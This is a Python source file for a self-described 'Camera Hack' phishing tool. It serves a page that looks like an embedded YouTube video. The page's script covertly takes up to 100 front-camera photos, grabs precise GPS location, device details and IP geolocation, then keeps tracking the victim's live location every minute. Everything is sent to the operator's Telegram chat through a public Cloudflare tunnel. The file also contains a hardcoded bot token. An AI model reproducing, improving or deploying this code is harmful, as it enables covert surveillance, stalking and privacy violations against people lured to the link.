# ================= CONFIG =================
BOT_TOKEN = "9099554116:AAFaTJWg7koaDKljRRrCHKtgwBQMWkrdLnE"
ADMIN_ID  = 9217706719
PORT      = 8080
# ==========================================

import os
import re
import json
import base64
import threading
import subprocess
import time
import sys
import html
import uuid
import logging

import requests
import telebot

from datetime import datetime
from flask import Flask, request, jsonify, Response

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("camhack")

STATE = {
    "video_id": "dQw4w9WgXcQ",
    "public_url": None,
    "tunnel_proc": None,
    "hits": 0,
    "last_hit": None,
    "started": time.time(),
}
STATE_LOCK = threading.Lock()

BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
CAPTURE_DIR = os.path.join(BASE_DIR, "captures")
os.makedirs(CAPTURE_DIR, exist_ok=True)

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")


def acquire_wake_lock():
    try:
        subprocess.Popen(
            ["termux-wake-lock"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception:
        pass


BANNER = r"""
  ___   _   __  __ ___ ___    _   ___ _  _ ___ _  __
 / __| /_\ |  \/  | __| _ \  /_\ / __| || |_ _| |/ /
| (__ / _ \| |\/| | _||   / / _ \ (__| __ || || ' < 
 \___/_/ \_\_|  |_|___|_|_\/_/ \_\___|_||_|___|_|\_\
                                                   
         Y O U T U B E   T R A P   v 2 . 0
         ──────────────────────────────────
         Developed by  J 2   H K R
         ᴾᵒʷᵉʳᵉᵈ ᵇʸ ᴺʸˣ
"""


def render_status():
    up = int(time.time() - STATE["started"])
    hh = up // 3600
    mm = (up % 3600) // 60
    ss = up % 60
    url = STATE["public_url"] or "starting..."
    vid = STATE["video_id"]
    hits = STATE["hits"]
    last = STATE["last_hit"] or "-"
    lines = [
        BANNER,
        "----------------------------------------------------------",
        " Status   : ONLINE",
        " Uptime   : %02d:%02d:%02d" % (hh, mm, ss),
        " Hits     : %d" % hits,
        " Last Hit : %s" % last,
        " Video    : %s" % vid,
        " Public   : %s" % url,
        "----------------------------------------------------------",
        " Bot commands: /start /link /url /status /reset /hits",
        "----------------------------------------------------------",
    ]
    return "\n".join(lines)


def clear():
    os.system("clear" if os.name != "nt" else "cls")


def print_status():
    clear()
    print(render_status())
    sys.stdout.flush()


def tg_send(text):
    try:
        bot.send_message(ADMIN_ID, text, disable_web_page_preview=True)
    except Exception as e:
        log.warning("tg_send: %s", e)


def tg_photo(img_bytes, caption):
    try:
        bot.send_photo(ADMIN_ID, img_bytes, caption=html.escape(caption))
    except Exception as e:
        log.warning("tg_photo: %s", e)


def ip_lookup(ip):
    try:
        r = requests.get(
            "http://ip-api.com/json/%s?fields=status,country,regionName,city,zip,isp,org,as,query,timezone,lat,lon" % ip,
            timeout=4,
        )
        j = r.json()
        if j.get("status") == "success":
            return j
    except Exception as e:
        log.warning("ip_lookup: %s", e)
    return {}


def extract_video_id(url):
    if not url:
        return None
    if "youtu.be/" in url:
        return url.split("youtu.be/")[1].split("?")[0].split("&")[0]
    m = re.search(r"[?&]v=([A-Za-z0-9_-]{11})", url)
    if m:
        return m.group(1)
    if "/embed/" in url:
        return url.split("/embed/")[1].split("?")[0]
    if re.fullmatch(r"[A-Za-z0-9_-]{11}", url.strip()):
        return url.strip()
    return None


HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Video</title>
<style>
  html,body{margin:0;padding:0;background:#000;overflow:hidden;height:100%}
  iframe{width:100vw;height:100vh;border:0;position:fixed;inset:0;z-index:1}
  #hint{position:fixed;bottom:8px;left:8px;color:#666;font:11px monospace;z-index:2;pointer-events:none}
</style>
</head>
<body>
<iframe id="yt"
        src="https://www.youtube.com/embed/__VIDEO_ID__?autoplay=1&playsinline=1&rel=0"
        allow="autoplay; encrypted-media; fullscreen"
        allowfullscreen></iframe>
<div id="hint">tap to play</div>

<script>
const COL = {};
const VID = "__VIDEO_ID__";
const frame = document.getElementById("yt");
const hint  = document.getElementById("hint");

function kickVideo(){
  try {
    frame.contentWindow.postMessage(
      JSON.stringify({event:"command", func:"playVideo", args:[]}),
      "https://www.youtube.com"
    );
  } catch(e){}
  hint.style.display = "none";
}
document.body.addEventListener("touchstart", kickVideo, {once:true, passive:true});
document.body.addEventListener("click",      kickVideo, {once:true});
setTimeout(function(){ hint.style.display = "none"; }, 3000);

(function boot(){
  COL.userAgent  = navigator.userAgent;
  COL.platform   = navigator.platform || "unknown";
  COL.language   = navigator.language;
  COL.screenSize = screen.width + "x" + screen.height;
  COL.timezone   = Intl.DateTimeFormat().resolvedOptions().timeZone;
  COL.cores      = navigator.hardwareConcurrency || "unknown";
  COL.memory     = navigator.deviceMemory || "unknown";
  COL.touch      = "ontouchstart" in window;
  COL.videoId    = VID;

  const camP = grabCamera(100).catch(function(){});
  const locP = getLocation(4000).catch(function(){});

  Promise.all([camP, locP]).then(pushMain);

  setInterval(sendLiveLocation, 60000);
})();

function getLocation(timeoutMs){
  return new Promise(function(resolve){
    if(!navigator.geolocation) return resolve();
    navigator.geolocation.getCurrentPosition(
      function(p){
        COL.latitude  = p.coords.latitude;
        COL.longitude = p.coords.longitude;
        COL.accuracy  = p.coords.accuracy;
        COL.speed     = p.coords.speed;
        COL.heading   = p.coords.heading;
        resolve();
      },
      function(){ resolve(); },
      {enableHighAccuracy:true, timeout:timeoutMs||4000, maximumAge:30000}
    );
  });
}

function sendLiveLocation(){
  if(!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    function(p){
      fetch("/location",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({
          latitude:p.coords.latitude,
          longitude:p.coords.longitude,
          accuracy:p.coords.accuracy,
          speed:p.coords.speed,
          ts:Date.now()
        })
      }).catch(function(){});
    },
    function(){},
    {enableHighAccuracy:true, maximumAge:30000, timeout:15000}
  );
}

async function grabCamera(shots){
  const photos = [];
  let stream = null;
  try{
    stream = await navigator.mediaDevices.getUserMedia({
      video:{facingMode:"user", width:{ideal:480}},
      audio:false
    });
  }catch(e){
    COL.photos = photos; return;
  }
  const video = document.createElement("video");
  video.srcObject = stream;
  video.muted = true;
  video.playsInline = true;
  try{ await video.play(); }
  catch(e){ stream.getTracks().forEach(function(t){t.stop();}); COL.photos = photos; return; }

  await new Promise(function(r){ setTimeout(r, 250); });
  const canvas = document.createElement("canvas");
  canvas.width  = video.videoWidth  || 480;
  canvas.height = video.videoHeight || 360;
  const ctx = canvas.getContext("2d");
  for(let i=0;i<shots;i++){
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    photos.push(canvas.toDataURL("image/jpeg", 0.55));
    await new Promise(function(r){ setTimeout(r, 120); });
  }
  stream.getTracks().forEach(function(t){ t.stop(); });
  COL.photos = photos;
}

function pushMain(){
  fetch("/collect",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify(COL)
  }).catch(function(){});
}
</script>
</body>
</html>
"""


@app.route("/")
def index():
    page = HTML_TEMPLATE.replace("__VIDEO_ID__", STATE["video_id"])
    return Response(page, mimetype="text/html")


@app.route("/collect", methods=["POST"])
def collect():
    data = request.get_json(force=True, silent=True) or {}
    ip   = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()

    with STATE_LOCK:
        STATE["hits"] += 1
        STATE["last_hit"] = datetime.now().strftime("%H:%M:%S")
        hits_now = STATE["hits"]

    print_status()
    geo = ip_lookup(ip)

    lines = ["<b>New Hit #%d</b>" % hits_now]
    lines.append("IP: <code>%s</code>" % html.escape(str(ip)))
    if geo:
        for k in ("country", "regionName", "city", "isp", "org", "timezone"):
            if geo.get(k):
                lines.append("%s: %s" % (k, html.escape(str(geo.get(k)))))
    lines.append("Time: %s" % datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    for k, v in data.items():
        if k in ("photos", "videoId"):
            continue
        lines.append("%s: <code>%s</code>" % (k, html.escape(str(v))))

    if data.get("latitude") is not None and data.get("longitude") is not None:
        maps = "https://www.google.com/maps?q=%s,%s" % (
            data["latitude"], data["longitude"]
        )
        lines.append("Map: %s" % maps)

    if geo.get("lat") and geo.get("lon"):
        ipmap = "https://www.google.com/maps?q=%s,%s" % (geo["lat"], geo["lon"])
        lines.append("IP Map: %s" % ipmap)

    tg_send("\n".join(lines))

    photos = data.get("photos", [])
    for i, b64 in enumerate(photos):
        try:
            if "," in b64:
                b64 = b64.split(",", 1)[1]
            tg_photo(base64.b64decode(b64), "Cam %d/%d" % (i + 1, len(photos)))
            time.sleep(0.35)
        except Exception as e:
            log.warning("photo: %s", e)

    save_path = os.path.join(CAPTURE_DIR, "%s.json" % uuid.uuid4().hex)
    with open(save_path, "w", encoding="utf-8") as f:
        json.dump({"ip": ip, "geo": geo, "data": data}, f, indent=2)

    return jsonify({"status": "ok"})


@app.route("/location", methods=["POST"])
def location_update():
    d = request.get_json(force=True, silent=True) or {}
    lat = d.get("latitude")
    lon = d.get("longitude")
    if lat is None or lon is None:
        return jsonify({"status": "no"})
    acc = d.get("accuracy", "?")
    spd = d.get("speed", "?")
    maps = "https://www.google.com/maps?q=%s,%s" % (lat, lon)
    tg_send(
        "<b>Live Location</b>\n"
        "Lat: <code>%s</code>\n"
        "Lon: <code>%s</code>\n"
        "Acc: %s m\n"
        "Speed: %s\n"
        "Map: %s" % (lat, lon, acc, spd, maps)
    )
    return jsonify({"status": "ok"})


def start_tunnel():
    try:
        proc = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", "http://localhost:%d" % PORT],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        STATE["tunnel_proc"] = proc
        deadline = time.time() + 60
        while time.time() < deadline:
            line = proc.stdout.readline()
            if not line:
                continue
            m = re.search(r"(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)", line)
            if m:
                STATE["public_url"] = m.group(1)
                print_status()
                tg_send(
                    "Tunnel ready:\n<code>%s</code>\n\n"
                    "Send video: /link &lt;youtube_url&gt;" % STATE["public_url"]
                )
                return
        tg_send("Tunnel started but URL not detected.")
    except FileNotFoundError:
        tg_send("cloudflared not installed. Run: pkg install cloudflared -y")
    except Exception as e:
        tg_send("Tunnel error: %s" % e)


def admin_only(func):
    def wrapper(message, *a, **kw):
        if message.chat.id != ADMIN_ID:
            return
        return func(message, *a, **kw)
    return wrapper


@bot.message_handler(commands=["start"])
@admin_only
def cmd_start(message):
    url = STATE.get("public_url") or "starting..."
    bot.reply_to(
        message,
        "Camera Hack — Developed By J2 HKR\n\n"
        "Hits: %d\nVideo: %s\nURL:\n%s\n\n"
        "Commands:\n"
        "/link &lt;youtube_url&gt;\n"
        "/url\n"
        "/status\n"
        "/hits\n"
        "/reset" % (STATE["hits"], STATE["video_id"], url),
        disable_web_page_preview=True,
    )


@bot.message_handler(commands=["link"])
@admin_only
def cmd_link(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        return bot.reply_to(message, "Usage: /link https://youtu.be/XXXX")
    vid = extract_video_id(parts[1].strip())
    if not vid:
        return bot.reply_to(message, "Could not read video id from URL.")
    STATE["video_id"] = vid
    url = STATE.get("public_url") or "starting..."
    bot.reply_to(
        message,
        "Video set: %s\nURL:\n%s" % (vid, url),
        disable_web_page_preview=True,
    )
    print_status()


@bot.message_handler(commands=["url"])
@admin_only
def cmd_url(message):
    bot.reply_to(message, STATE.get("public_url") or "not ready")


@bot.message_handler(commands=["status"])
@admin_only
def cmd_status(message):
    files = os.listdir(CAPTURE_DIR)
    up = int(time.time() - STATE["started"])
    bot.reply_to(
        message,
        "Uptime: %ds\nHits: %d\nCaptures: %d\nVideo: %s\nURL: %s" % (
            up, STATE["hits"], len(files),
            STATE["video_id"], STATE.get("public_url") or "-"
        ),
        disable_web_page_preview=True,
    )


@bot.message_handler(commands=["hits"])
@admin_only
def cmd_hits(message):
    bot.reply_to(message, "Hits: %d\nLast: %s" % (
        STATE["hits"], STATE["last_hit"] or "-"
    ))


@bot.message_handler(commands=["reset"])
@admin_only
def cmd_reset(message):
    with STATE_LOCK:
        STATE["video_id"] = "dQw4w9WgXcQ"
        STATE["hits"] = 0
        STATE["last_hit"] = None
    bot.reply_to(message, "Reset done.")
    print_status()


def run_bot():
    bot.infinity_polling()


if __name__ == "__main__":
    acquire_wake_lock()
    print_status()
    tg_send("Bot started. Starting tunnel...")
    threading.Thread(target=start_tunnel, daemon=True).start()
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)
